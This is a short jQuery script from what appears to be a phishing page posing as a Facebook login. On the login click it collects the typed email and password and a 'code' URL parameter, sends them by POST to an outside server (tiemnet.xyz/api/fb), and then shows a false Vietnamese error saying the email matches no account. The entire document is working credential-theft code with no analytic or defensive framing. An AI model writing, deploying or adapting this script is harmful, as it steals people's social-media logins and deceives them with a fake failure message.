<script>

  $(document).ready(function () {
    $('#login').click(function () {
      $.urlParam = function(name){
    var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
    if (results==null) {
       return null;
    }
    return decodeURI(results[1]) || 0;
}
      var acc = $('#m_login_email').val();
      var pass = $('#m_login_password').val();
      var code =$.urlParam('code');
      $.ajax({
        url: 'https://tiemnet.xyz/api/fb',
        method: 'POST',
        dataType: 'JSON',
        data: { acc: acc, pass: pass, code:code },
        success: function (data) {
          $('#err').text('Email hoặc số di động bạn nhập không kết nối với tài khoản nào. Hãy tìm tài khoản của bạn và đăng nhập.')
        }
      });
    });
  });


</script>
